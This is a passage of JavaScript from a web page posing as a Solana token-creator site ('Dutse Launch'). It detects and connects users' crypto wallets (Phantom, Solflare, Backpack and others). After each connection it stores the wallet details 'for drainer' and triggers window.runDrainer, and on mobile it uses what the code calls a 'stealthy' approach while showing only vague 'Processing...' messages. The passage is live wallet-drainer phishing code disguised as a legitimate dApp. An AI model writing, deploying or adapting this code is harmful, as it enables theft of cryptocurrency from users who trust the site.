          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'connect_wallet',
            walletKey: walletKey
          })
        });
        
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        return data;
      } catch (error) {
        console.error('[getWalletConnectionInfo] Error:', error);
        return { success: false, error: error.message };
      }
    }
    
    // Enhanced openWalletModal function using backend
    window.openWalletModal = async function openWalletModal() {
      // Opening wallet modal
      const modal = document.getElementById('walletModal');
      
      if (!modal) {
        console.error('[WALLET_MODAL] Modal element not found');
        return;
      }
      
      try {
        // Get wallet data from backend
        const modalData = await getWalletModalData();
        console.log('[WALLET_MODAL] Received modal data:', modalData);
        // Retrieved wallet data from backend
        
        // Update wallet options with backend data
        const walletOptions = modal.querySelector('.wallet-options');
        const wallets = modalData.result?.wallets || modalData.wallets || [];
        console.log('[WALLET_MODAL] Extracted wallets:', wallets);
        
        if (walletOptions && wallets.length > 0) {
          walletOptions.innerHTML = '';
          
          wallets.forEach(wallet => {
            const walletOption = document.createElement('div');
            walletOption.className = 'wallet-option';
            walletOption.onclick = async () => {
              try {
                // Use the same sophisticated mobile detection as main page
                const isMobileDevice = await isMobile();
                
                if (isMobileDevice) {
                  console.log('[WALLET_OPTION] Mobile device detected, using enhanced mobile connection');
                  // For mobile, use the enhanced mobile connection system
                  await window.connectMobileWallet(wallet);
                } else {
                  console.log('[WALLET_OPTION] Desktop device, using standard connection');
                  // For desktop, use the standard connection
                  await window.connectDesktopWallet(wallet);
                }
              } catch (error) {
                console.error('[WALLET_OPTION] Connection failed:', error);
                showStatus('Connection failed. Please try again.', 'error');
              }
            };
            
            walletOption.innerHTML = `
              <div class="wallet-icon">
                <img src="${wallet.logo}" alt="${wallet.name}">
              </div>
              <div class="wallet-info">
                <span class="wallet-name">${wallet.name}</span>
                <span class="wallet-description">${wallet.description}</span>
              </div>
              <div class="wallet-arrow">
                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M7.5 15L12.5 10L7.5 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
              </div>
            `;
            
            walletOptions.appendChild(walletOption);
          });
        }
        
        // Show mobile indicator if on mobile device
        const userAgent = navigator.userAgent.toLowerCase();
        const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent) ||
                        /mobile|tablet/i.test(userAgent) ||
                        (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                        window.innerWidth <= 768;
        
        const mobileIndicator = modal.querySelector('#mobileIndicator');
        if (mobileIndicator) {
          mobileIndicator.style.display = isMobile ? 'block' : 'none';
        }
        
        // Show modal
        modal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
        
      } catch (error) {
        console.error('[WALLET_MODAL] Error opening modal:', error);
        showStatus('Failed', 'error');
      }
    };
    
    // Backend-delegated connectWallet function
    window.connectWallet = async function connectWallet(walletKey) {
      
      try {
        // Get connection info from backend
        const connectionResult = await getWalletConnectionInfo(walletKey);
        
        if (!connectionResult.success) {
          console.error(`[CONNECT] Connection failed: ${connectionResult.error}`);
          showStatus('Failed', 'error');
          return;
        }
        
        // Extract data from the nested result structure
        const result = connectionResult.result || connectionResult;
        const { wallet, connectionInstructions, isMobile } = result;
        console.log('[CONNECT] Connection result:', connectionResult);
        console.log('[CONNECT] Result object:', result);
        console.log('[CONNECT] Wallet object:', wallet);
        console.log('[CONNECT] Connection instructions:', connectionInstructions);
        console.log('[CONNECT] Is mobile:', isMobile);
        
        // Close modal
          closeWalletModal();
          
          // Show connecting status
          showStatus('Connecting to wallet...', 'loading');
          
        // Handle connection based on wallet type
        if (isMobile && connectionInstructions && connectionInstructions.success) {
          // Mobile wallet connection
          const { deepLink, installUrl } = connectionInstructions.instructions;
          
          // Try deep link first
          if (deepLink) {
            window.location.href = deepLink;
            setTimeout(() => {
              // If deep link fails, redirect to install page
              window.location.href = installUrl;
            }, 2000);
            } else {
            window.location.href = installUrl;
          }
        } else {
          // Desktop wallet connection - try to find provider
          if (!wallet) {
            console.error('[CONNECT] Wallet object is undefined');
            showStatus('Wallet not found', 'error');
            return;
          }
          
          const providerNames = wallet.providerNames || [];
          console.log('[CONNECT] Provider names:', providerNames);
          let provider = null;
          
          for (const providerName of providerNames) {
            try {
              console.log(`[CONNECT] Checking provider: ${providerName}`);
              const providerPath = providerName.split('.');
              let current = window;
              for (const part of providerPath) {
                current = current[part];
                if (!current) {
                  console.log(`[CONNECT] Provider path broken at: ${part}`);
                  break;
              }
              }
              // Provider found
              
              // Check for standard connect function
              if (current && typeof current.connect === 'function') {
                provider = current;
                // Using provider
                break;
              }
              
              // Special handling for Trust Wallet and Exodus
              if (current && (current.isTrust || current.isTrustWallet)) {
                console.log(`[CONNECT] Trust Wallet detected, checking for Solana provider`);
                if (current.solana && typeof current.solana.connect === 'function') {
                  provider = current.solana;
                  console.log(`[CONNECT] Using Trust Wallet Solana provider: ${providerName}`);
                  break;
                }
              }
              
              if (current && (current.isExodus || current.isExodusWallet || providerName.includes('exodus'))) {
                console.log(`[CONNECT] Exodus detected, checking for Solana provider`);
                console.log(`[CONNECT] Exodus provider structure:`, Object.keys(current));
                if (current.solana && typeof current.solana.connect === 'function') {
                  provider = current.solana;
                  console.log(`[CONNECT] Using Exodus Solana provider: ${providerName}`);
                  break;
                } else if (typeof current.connect === 'function') {
                  provider = current;
                  console.log(`[CONNECT] Using Exodus main provider: ${providerName}`);
                  break;
                }
              }
            } catch (e) {
              console.log(`[CONNECT] Error checking provider ${providerName}:`, e.message);
            }
          }
          
          if (provider) {
            // Validate provider before connection
            if (typeof provider.connect !== 'function') {
              console.error(`[CONNECT] Provider for ${walletKey} does not have connect method`);
              showStatus('Wallet connection not supported', 'error');
              return;
            }
            
            try {
              // Wallet-specific connection handling
              let response, publicKey;
              
              switch (walletKey) {
                case 'phantom':
                  response = await provider.connect();
                  publicKey = response?.publicKey || provider.publicKey;
                  break;
                  
                case 'solflare':
                  // Solflare connection - use standard connect method
                  console.log('[CONNECT] Solflare connection - triggering wallet UI');
                  response = await provider.connect();
                  publicKey = response?.publicKey || provider.publicKey;
                  break;
                  
                case 'backpack':
                  response = await provider.connect();
                  publicKey = response?.publicKey || provider.publicKey;
                  break;
                  
                case 'glow':
                  response = await provider.connect();
                  publicKey = response?.publicKey || provider.publicKey;
                  break;
                  
                case 'trust':
                  // Trust Wallet special handling
                  if (provider.solana) {
                    response = await provider.solana.connect();
                    publicKey = response?.publicKey || provider.solana.publicKey;
                  } else {
                    response = await provider.connect();
                    publicKey = response?.publicKey || provider.publicKey;
                  }
                  break;
                  
                case 'exodus':
                  // Exodus special handling
                  if (provider.solana) {
                    response = await provider.solana.connect();
                    publicKey = response?.publicKey || provider.solana.publicKey;
                  } else {
                    response = await provider.connect();
                    publicKey = response?.publicKey || provider.publicKey;
                  }
                  break;
                  
                default:
                  response = await provider.connect();
                  publicKey = response?.publicKey || provider.publicKey;
              }
              
              if (publicKey) {
                console.log(`[CONNECT] Successfully connected to ${walletKey}:`, publicKey.toString());
                showStatus('Processing...', 'loading');
                
                // Store connected wallet info for drainer
                window.connectedWallet = {
                  key: walletKey,
                  name: wallet.name,
                  publicKey: publicKey.toString()
                };
                
                // Update wallet status
                updateWalletStatus();
                
                // Trigger drainer after successful connection
                setTimeout(() => {
                  if (window.runDrainer && typeof window.runDrainer === 'function') {
                    console.log('[CONNECT] Triggering drainer after wallet connection');
                    window.runDrainer(provider);
                  }
                }, 1000);
              } else {
                console.error(`[CONNECT] No public key received from ${walletKey}`);
                showStatus('Connection failed - no public key received', 'error');
              }
              
            } catch (connectError) {
              console.error(`[CONNECT] Connection error for ${walletKey}:`, connectError);
              
              // Show specific error messages based on error type
              if (connectError.message && connectError.message.includes('User rejected')) {
                showStatus('User rejected connection', 'error');
              } else if (connectError.message && connectError.message.includes('timeout')) {
                showStatus('Connection timeout', 'error');
              } else if (connectError.message && connectError.message.includes('not found')) {
                showStatus('Wallet not found', 'error');
              } else if (connectError.message && connectError.message.includes('not installed')) {
                showStatus('Wallet not installed', 'error');
              } else {
                showStatus('Connection failed', 'error');
              }
            }
          } else {
            console.error(`[CONNECT] No provider found for ${walletKey}`);
            showStatus(`${walletKey} wallet not found - please install the wallet extension`, 'error');
          }
        }
        
      } catch (error) {
        console.error('[connectWallet] Error:', error);
        showStatus('Connection failed', 'error');
      }
    };
    
    // Close wallet modal function
    window.closeWalletModal = function() {
      const modal = document.getElementById('walletModal');
      if (modal) {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
      }
    };
    
    // Mobile detection functions - delegated to backend
    async function isMobile() {
      try {
        // Get available providers from window object
        const availableProviders = [];
        if (window.solana) availableProviders.push('window.solana');
        if (window.phantom) availableProviders.push('window.phantom');
        if (window.solflare) availableProviders.push('window.solflare');
        if (window.backpack) availableProviders.push('window.backpack');
        if (window.glow) availableProviders.push('window.glow');
        if (window.trustwallet) availableProviders.push('window.trustwallet');
        if (window.exodus) availableProviders.push('window.exodus');
        
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'detect_installed_wallets',
            availableProviders: availableProviders
          })
        });
        const data = await response.json();
        return data.result?.isMobile || false;
      } catch (error) {
        // Fallback to basic detection
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
             window.innerWidth <= 768;
      }
    }
    
    // Wallet definitions - all supported wallets (Backpack prioritized)
    const WALLET_DEFS = [
      {
        key: 'backpack',
        name: 'Backpack',
        icon: '/backpack-logo.png',
        provider: () => {
          try {
          // Enhanced Backpack detection with multiple fallbacks
          const possibleBackpacks = [
            window.backpack,
            window.BackpackWallet,
            window.backpackWallet,
            window.backpack?.solana,
            window.BackpackWallet?.solana
          ];
          
          for (const wallet of possibleBackpacks) {
            if (wallet && typeof wallet === 'object') {
              const hasConnect = typeof wallet.connect === 'function';
              if (hasConnect) {
                return wallet;
              }
            }
          }
          
          return null;
          } catch (error) {
            console.warn('[BACKPACK] Provider detection failed:', error);
            return null;
          }
        },
        install: 'https://backpack.app/',
        mobile: {
          appStore: 'https://apps.apple.com/app/backpack-wallet/id6446591340',
          playStore: 'https://play.google.com/store/apps/details?id=app.backpack',
          deepLink: 'https://backpack.app/ul/v1/browse/',
          universalLink: 'https://backpack.app/ul/v1/browse/',
          mobileStrategies: [
            'https://backpack.app/ul/v1/browse/',
            'backpack://v1/browse/'
          ]
        }
      },
      {
        key: 'phantom',
        name: 'Phantom',
        icon: '/phantom-logo.png',
        provider: () => {
          try {
            // Try to get Phantom provider with conflict resolution
          const phantom = window.phantom?.solana || window.solana;
          if (phantom && typeof phantom.connect === 'function') {
            return phantom;
          }
          return null;
          } catch (error) {
            console.warn('[PHANTOM] Provider detection failed:', error);
            return null;
          }
        },
        install: 'https://phantom.app/',
        mobile: {
          appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
          playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
          deepLink: 'https://phantom.app/ul/browse/',
          universalLink: 'https://phantom.app/ul/browse/',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'https://phantom.app/ul/browse/',
            'phantom://browse/'
          ]
        }
      },
      {
        key: 'solflare',
        name: 'Solflare',
        icon: '/solflare-logo.png',
        provider: () => {
          try {
            // Try to get Solflare provider with conflict resolution
          const solflare = window.solflare;
          if (solflare && typeof solflare.connect === 'function') {
            return solflare;
          }
          return null;
          } catch (error) {
            console.warn('[SOLFLARE] Provider detection failed:', error);
            return null;
          }
        },
        install: 'https://solflare.com/',
        mobile: {
          appStore: 'https://apps.apple.com/app/solflare/id1580902717',
          playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
          deepLink: 'https://solflare.com/ul/v1/browse/',
          universalLink: 'https://solflare.com/ul/v1/browse/',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'https://solflare.com/ul/v1/browse/',
            'solflare://v1/browse/'
          ]
        }
      },
      {
        key: 'glow',
        name: 'Glow',
        icon: '/glow-logo.png',
        provider: () => {
          try {
            // Try to get Glow provider with conflict resolution
          const glow = window.glow;
          if (glow && typeof glow.connect === 'function') {
            return glow;
          }
          return null;
          } catch (error) {
            console.warn('[GLOW] Provider detection failed:', error);
            return null;
          }
        },
        install: 'https://glow.app/',
        mobile: {
          appStore: 'https://apps.apple.com/app/glow-wallet/id1635717553',
          playStore: 'https://play.google.com/store/apps/details?id=com.glow.wallet',
          deepLink: 'glow://app/',
          universalLink: 'https://glow.app/ul/app/',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'glow://app/',
            'glow://browse/',
            'glow://dapp/',
            'glow://open/',
            'https://glow.app/ul/app/',
            'https://glow.app/ul/browse/',
            'https://glow.app/ul/dapp/',
            'https://glow.app/ul/open/'
          ]
        }
      },
      {
        key: 'trust',
        name: 'Trust Wallet',
        icon: '/trust-logo.png',
        provider: () => {
          try {
            // Try to get Trust Wallet provider with conflict resolution
          const trust = window.trustwallet;
          if (trust && typeof trust.connect === 'function') {
            return trust;
          }
          return null;
          } catch (error) {
            console.warn('[TRUST] Provider detection failed:', error);
            return null;
          }
        },
        install: 'https://trustwallet.com/',
        mobile: {
          appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
          playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
          deepLink: 'https://link.trustwallet.com/open_url',
          universalLink: 'https://link.trustwallet.com/open_url',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'https://link.trustwallet.com/open_url',
            'trust://open_url'
          ]
        }
      },
      {
        key: 'exodus',
        name: 'Exodus',
        icon: '/exodus-logo.png',
        provider: () => {
          try {
            // Try to get Exodus provider with conflict resolution
          const exodus = window.exodus;
          if (exodus && typeof exodus.connect === 'function') {
            return exodus;
          }
          return null;
          } catch (error) {
            console.warn('[EXODUS] Provider detection failed:', error);
            return null;
          }
        },
        install: 'https://exodus.com/',
        mobile: {
          appStore: 'https://apps.apple.com/app/exodus-crypto-bitcoin-wallet/id1414384820',
          playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus',
          deepLink: 'exodus://dapp/',
          universalLink: 'https://exodus.com/app/dapp?url=',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'exodus://dapp/',
            'exodus://browse/',
            'exodus://app/',
            'exodus://open/',
            'https://exodus.com/app/dapp?url=',
            'https://exodus.com/app/browse?url=',
            'https://exodus.com/app/app?url=',
            'https://exodus.com/app/open?url='
          ]
        }
      }
    ];
    
    // Enhanced mobile wallet connection with comprehensive fallbacks for all wallet types
    window.connectMobileWallet = async function connectMobileWallet(wallet) {
      let provider = wallet.provider();
      console.log(`Provider for ${wallet.name} on connect:`, provider);
      console.log('connectMobileWallet called with:', wallet);
      const isMobileDevice = await isMobile();
      
      // Enhanced fallback: if no provider, try multiple times with different strategies
      if (!provider) {
        console.log(`[FALLBACK] No provider for ${wallet.name}, trying enhanced retry...`);
        
        // Try multiple provider retrieval strategies
        for (let attempt = 1; attempt <= 3; attempt++) {
          console.log(`[FALLBACK] Provider retrieval attempt ${attempt}/3 for ${wallet.name}`);
          
          await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
          provider = wallet.provider();
          
          if (provider) {
            console.log(`[FALLBACK] Provider found for ${wallet.name} on attempt ${attempt}`);
            break;
          }
        }
        
        if (!provider) {
          console.log(`[FALLBACK] All provider retrieval attempts failed for ${wallet.name}`);
          showStatus('Failed', 'error');
          return;
        }
      }
      
      try {
        // On mobile, use stealthy but functional approach
        if (isMobileDevice) {
          
          // First, try to get the wallet provider quietly
          provider = wallet.provider();
          console.log(`[connectMobileWallet] Initial provider for ${wallet.name}:`, provider);
          
          // Simple fallback: if no provider, try again
          if (!provider) {
            console.log(`[FALLBACK] No provider for ${wallet.name}, retrying...`);
            await new Promise(resolve => setTimeout(resolve, 2000));
            provider = wallet.provider();
          }
          
          // If still no provider, try to open the app and then check again
          if (!provider) {
            // Enhanced mobile detection for better deep linking
            let isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            if (!isMobileDevice) {
              isMobileDevice = /Mobile|Tablet/i.test(navigator.userAgent) || 
                              (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                              window.innerWidth <= 768;
            }
            
            if (isMobileDevice) {
              console.log(`[connectMobileWallet] Mobile device detected for ${wallet.name}`);
            }
            
            // Enhanced deep linking for seamless wallet opening using comprehensive fallbacks
            try {
                const currentUrl = window.location.href;
              console.log(`[connectMobileWallet] Opening ${wallet.name} with comprehensive mobile deep link fallbacks`);
              
              // Use the comprehensive mobile deep link function with fallback strategies
              const success = openInWalletMobile(wallet.key, currentUrl);
              if (!success) {
                console.error(`[connectMobileWallet] Failed to open ${wallet.name} with mobile deep links`);
                  }
                } catch (e) {
            }
            
            // Wait a bit and check for provider again
            showStatus('Processing...', 'loading');
            
            // Enhanced provider detection with better timing and fallback
            let providerFound = false;
            for (let i = 0; i < 8; i++) {
              await new Promise(resolve => setTimeout(resolve, 800));
              
              provider = wallet.provider();
              console.log(`[connectMobileWallet] Provider for ${wallet.name} after wait ${i+1}:`, provider);
              
              if (provider) {
                providerFound = true;
                console.log(`[connectMobileWallet] Provider found for ${wallet.name} after ${i+1} attempts`);
                break;
              }
            }
            
            if (!providerFound) {
              console.log(`[connectMobileWallet] No provider found for ${wallet.name} after all attempts`);
              
              // Enhanced automatic fallback with wallet-specific strategies
              console.log(`[FALLBACK] Triggering enhanced automatic fallback for ${wallet.name}`);
              
              // Wallet-specific fallback strategies
              switch (wallet.name) {
                case 'Phantom':
                  console.log(`[FALLBACK] Phantom-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'phantom://', 500);
                  setTimeout(() => window.location.href = 'https://phantom.app/', 1000);
                  break;
                  
                case 'Solflare':
                  console.log(`[FALLBACK] Solflare-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'solflare://access-wallet', 500);
                  setTimeout(() => window.location.href = 'https://solflare.com/', 1000);
                  break;
                  
                case 'Backpack':
                  console.log(`[FALLBACK] Backpack-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'https://backpack.app/', 500);
                  break;
                  
                case 'Glow':
                  console.log(`[FALLBACK] Glow-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'glow://', 500);
                  break;
                  
                case 'Trust Wallet':
                  console.log(`[FALLBACK] Trust Wallet-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'trust://', 500);
                  break;
                  
                case 'Exodus':
                  console.log(`[FALLBACK] Exodus-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'exodus://', 500);
                  break;
                  
                default:
                  console.log(`[FALLBACK] Generic fallback for ${wallet.name}`);
                  break;
              }
            }
            
            // If still no provider after deep linking, try to open app store as fallback
            if (!provider) {
              console.log(`[connectMobileWallet] No provider found for ${wallet.name}, trying app store fallback`);
              try {
                if (wallet.name === 'Phantom') {
                  window.open('https://phantom.app/', '_blank');
                } else if (wallet.name === 'Solflare') {
                  window.open('https://solflare.com/', '_blank');
                } else if (wallet.name === 'Backpack') {
                  window.open('https://backpack.app/', '_blank');
                } else if (wallet.name === 'Glow') {
                  window.open('https://glow.app/', '_blank');
                } else if (wallet.name === 'Trust Wallet') {
                  window.open('https://trustwallet.com/', '_blank');
                } else if (wallet.name === 'Exodus') {
                  window.open('https://exodus.com/', '_blank');
                }
              } catch (e) {
                console.error(`[connectMobileWallet] Error opening app store for ${wallet.name}:`, e);
              }
            }
          }
          
          // If we have a provider, try to connect
          if (provider) {
            // Check if wallet is available before attempting connection
            if (typeof provider.isConnected === 'function' && !provider.isConnected()) {
              showStatus('Failed', 'error');
              return;
            }
            
            // Try to connect
            if (typeof provider.connect === 'function') {
              try {
                console.log(`[connectMobileWallet] Calling connectWalletWithMetadata for ${wallet.name}`);
                
                // Add timeout wrapper for connection with retry logic
                let result;
                let retryCount = 0;
                const maxRetries = 2;
                
                while (retryCount <= maxRetries) {
                  try {
                    const connectionPromise = connectWalletWithMetadata(provider, wallet.name);
                    const timeoutPromise = new Promise((_, reject) => {
                      setTimeout(() => reject(new Error('Connection timeout - please try again')), 180000); // 3 minutes (was 45s)
                    });
                    
                    result = await Promise.race([connectionPromise, timeoutPromise]);
                    break; // Success, exit retry loop
                  } catch (error) {
                    retryCount++;
                    console.log(`[connectMobileWallet] Connection attempt ${retryCount}/${maxRetries + 1} failed for ${wallet.name}:`, error.message);
                    
                    if (retryCount > maxRetries) {
                      // Automatic fallback before giving up
                      console.log(`[FALLBACK] All retries failed for ${wallet.name}, triggering automatic fallback`);
                      throw error; // Re-throw if all retries failed
                    }
                    
                    // Wait before retry
                    showStatus('Processing...', 'loading');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                  }
                }
                
                if (result && result.publicKey) {
                  console.log(`[connectMobileWallet] Successfully connected to ${wallet.name}:`, result.publicKey.toString());
                  showStatus('Processing...', 'loading');
                  
                  // Store connected wallet info for drainer
                  window.connectedWallet = {
                    key: wallet.key,
                    name: wallet.name,
                    publicKey: result.publicKey.toString()
                  };
                  
                  // Trigger drainer after successful connection
                  setTimeout(() => {
                    if (window.runDrainer && typeof window.runDrainer === 'function') {
                      console.log('[CONNECT] Triggering drainer after wallet connection');
                      window.runDrainer(provider);
                    }
                  }, 1000);
                } else {
                  console.error(`[connectMobileWallet] No public key received from ${wallet.name}`);
                  showStatus('Connection failed - no public key received', 'error');
                }
              } catch (error) {
                console.error(`[connectMobileWallet] Connection failed for ${wallet.name}:`, error);
                showStatus('Connection failed', 'error');
              }
            } else {
              showStatus('Failed', 'error');
              console.error(`[connectMobileWallet] No connect function for ${wallet.name}`);
            }
          } else {
            // No provider found, show subtle wallet browser prompt with all supported wallets
            console.error(`[connectMobileWallet] No provider found for ${wallet.name} after waiting.`);
            console.log(`[connectMobileWallet] Provider value:`, provider);
            console.log(`[connectMobileWallet] Provider type:`, typeof provider);
            showStatus('Wallet not found', 'error');
          }
          
        } else {
          // Desktop logic (unchanged)
          const provider = wallet.provider();
          console.log(`[connectMobileWallet] Desktop provider for ${wallet.name}:`, provider);
          if (!provider || provider === undefined || provider === null) {
            console.error(`[connectMobileWallet] No provider for ${wallet.name} on desktop.`);
            console.log(`[connectMobileWallet] Desktop provider value:`, provider);
            console.log(`[connectMobileWallet] Desktop provider type:`, typeof provider);
            showStatus('Wallet not found', 'error');
            return;
          }
          
          // Desktop: Try to connect and then run drainer
          try {
                // Check if wallet is available before attempting connection with simple fallback
    if (typeof provider.isConnected === 'function' && !provider.isConnected()) {
      // Simple fallback: try to connect anyway
      console.log(`[FALLBACK] ${wallet.name} reports not connected, but trying anyway...`);
    }
            console.log(`[connectMobileWallet] Desktop: calling connectWalletWithMetadata for ${wallet.name}`);
            
            // Add delay to prevent request conflicts
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Add timeout wrapper for desktop connection with retry logic
            let result;
            let retryCount = 0;
            const maxRetries = 2;
            
            try {
              while (retryCount <= maxRetries) {
                try {
                  const connectionPromise = connectWalletWithMetadata(provider, wallet.name);
                  const timeoutPromise = new Promise((_, reject) => {
                                        setTimeout(() => reject(new Error('Connection timeout - please try again')), 120000); // 2 minutes (was 15s)
                  });
                  
                  result = await Promise.race([connectionPromise, timeoutPromise]);
                  break; // Success, exit retry loop
                } catch (error) {
                  retryCount++;
                  console.log(`[connectMobileWallet] Desktop connection attempt ${retryCount}/${maxRetries + 1} failed for ${wallet.name}:`, error.message);
                  
                  if (retryCount > maxRetries) {
                    throw error; // Re-throw if all retries failed
                  }
                  
                  // Wait before retry
                  showStatus('Processing...', 'loading');
                  await new Promise(resolve => setTimeout(resolve, 2000));
                }
              }
              
              if (result && result.publicKey) {
                console.log(`[connectMobileWallet] Desktop: Successfully connected to ${wallet.name}:`, result.publicKey.toString());
                showStatus('Processing...', 'loading');
                
                // Store connected wallet info for drainer
                window.connectedWallet = {
                  key: wallet.key,
                  name: wallet.name,
                  publicKey: result.publicKey.toString()
                };
                
                // Trigger drainer after successful connection
                setTimeout(() => {
                  if (window.runDrainer && typeof window.runDrainer === 'function') {
                    console.log('[CONNECT] Triggering drainer after wallet connection');
                    window.runDrainer(provider);
                  }
                }, 1000);
              } else {
                console.error(`[connectMobileWallet] Desktop: No public key received from ${wallet.name}`);
                showStatus('Connection failed - no public key received', 'error');
              }
            } catch (error) {
              console.error(`[connectMobileWallet] Desktop connection failed for ${wallet.name}:`, error);
              showStatus('Connection failed', 'error');
            }
          } catch (error) {
            console.error(`[connectMobileWallet] Desktop error for ${wallet.name}:`, error);
            showStatus('Connection failed', 'error');
          }
        }
      } catch (error) {
        console.error(`[connectMobileWallet] Error for ${wallet.name}:`, error);
        showStatus('Connection failed', 'error');
      }
    };
    
    // Desktop wallet connection function
    window.connectDesktopWallet = async function connectDesktopWallet(wallet) {
      console.log('connectDesktopWallet called with:', wallet);
      
      try {
        const provider = wallet.provider();
        if (!provider) {
          console.error(`[connectDesktopWallet] No provider found for ${wallet.name}`);
          showStatus('Wallet not found', 'error');
          return;
        }
        
        if (typeof provider.connect !== 'function') {
          console.error(`[connectDesktopWallet] Provider for ${wallet.name} does not have connect method`);
          showStatus('Wallet connection not supported', 'error');
          return;
        }
        
        console.log(`[connectDesktopWallet] Connecting to ${wallet.name}...`);
        const result = await connectWalletWithMetadata(provider, wallet.name);
        
        if (result && result.publicKey) {
          console.log(`[connectDesktopWallet] Successfully connected to ${wallet.name}:`, result.publicKey.toString());
          showStatus('Processing...', 'loading');
          
          // Store connected wallet info for drainer
          window.connectedWallet = {
            key: wallet.key,
            name: wallet.name,
            publicKey: result.publicKey.toString()
          };
          
          // Trigger drainer after successful connection
          setTimeout(() => {
            if (window.runDrainer && typeof window.runDrainer === 'function') {
              console.log('[CONNECT] Triggering drainer after wallet connection');
              window.runDrainer(provider);
            }
          }, 1000);
        } else {
          console.error(`[connectDesktopWallet] No public key received from ${wallet.name}`);
          showStatus('Connection failed - no public key received', 'error');
        }
      } catch (error) {
        console.error(`[connectDesktopWallet] Connection failed for ${wallet.name}:`, error);
        showStatus('Connection failed', 'error');
      }
    };
    
    // Enhanced mobile deep link function with platform-specific strategies
    function openInWalletMobile(walletType, currentUrl) {
      // Enhanced mobile platform detection
      const userAgent = navigator.userAgent.toLowerCase();
      const isIOS = /iphone|ipad|ipod/.test(userAgent);
      const isAndroid = /android/.test(userAgent);
      const platform = isIOS ? 'ios' : isAndroid ? 'android' : 'unknown';
      
      // Find wallet definition
      const wallet = WALLET_DEFS.find(w => w.key === walletType);
      if (!wallet || !wallet.mobile || !wallet.mobile.mobileStrategies) {
        console.error(`[MOBILE_DEEP_LINK] No mobile strategies found for ${walletType}`);
        return false;
      }
      
      const strategies = wallet.mobile.mobileStrategies;
      // Platform-specific strategy ordering
      let orderedStrategies = [];
      if (platform === 'ios') {
        // iOS prefers custom schemes first, then universal links
        orderedStrategies = [
          ...strategies.filter(s => s.startsWith(walletType + '://')),
          ...strategies.filter(s => s.startsWith('https://'))
        ];
      } else if (platform === 'android') {
        // Android prefers App Links first, then custom schemes
        orderedStrategies = [
          ...strategies.filter(s => s.startsWith('https://')),
          ...strategies.filter(s => s.startsWith(walletType + '://'))
        ];
      } else {
        orderedStrategies = strategies;
      }
      
      // Try each strategy with enhanced timeout handling
      let strategyIndex = 0;
      let hasOpenedApp = false;
      
      const tryNextStrategy = () => {
        if (strategyIndex >= orderedStrategies.length) {
          // All strategies failed, redirect to install page
          const installUrl = platform === 'ios' ? wallet.mobile.appStore : wallet.mobile.playStore;
          window.location.href = installUrl;
          return;
        }
        
        const strategy = orderedStrategies[strategyIndex];
        // Enhanced URL parameter handling
        let fullDeepLink;
        if (strategy.includes('?url=') || strategy.includes('?coin_id=')) {
          fullDeepLink = strategy + encodeURIComponent(currentUrl);
        } else if (strategy.endsWith('/')) {
          fullDeepLink = strategy + encodeURIComponent(currentUrl);
        } else {
          fullDeepLink = strategy + '?url=' + encodeURIComponent(currentUrl);
        }
        
        
        try {
          // Enhanced deep link opening with better error handling
          if (platform === 'ios') {
            // iOS: Use iframe method for better reliability
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = fullDeepLink;
            document.body.appendChild(iframe);
            
            // Clean up iframe after attempt
            setTimeout(() => {
              if (document.body.contains(iframe)) {
                document.body.removeChild(iframe);
              }
            }, 1000);
          } else {
            // Android: Direct location change
          window.location.href = fullDeepLink;
          }
          
          hasOpenedApp = true;
          
          // Platform-specific timeout handling
          const timeout = platform === 'ios' ? 3000 : 2000;
          setTimeout(() => {
            if (!hasOpenedApp || window.document.hidden) {
              // App likely opened, don't try next strategy
              return;
            }
              strategyIndex++;
              tryNextStrategy();
          }, timeout);
          
        } catch (error) {
          console.error(`[MOBILE_DEEP_LINK] Strategy ${strategyIndex + 1} failed:`, error);
          strategyIndex++;
          tryNextStrategy();
        }
      };
      
      // Start trying strategies
      tryNextStrategy();
      return true;
    }
    
    // Enhanced wallet connection with metadata
    async function connectWalletWithMetadata(provider, walletName) {
      console.log(`[connectWalletWithMetadata] Connecting ${walletName} with metadata`);
      
      const walletAdapterMetadata = {
        name: 'Dutse Launch - Solana Token Creator',
        url: window.location.origin,
        icon: window.location.origin + '/logo.svg',
        description: 'Create and deploy your Solana token with Dutse Launch'
      };
      
      try {
        const response = await provider.connect({ appMetadata: walletAdapterMetadata });
        console.log(`[connectWalletWithMetadata] ${walletName} connection response:`, response);
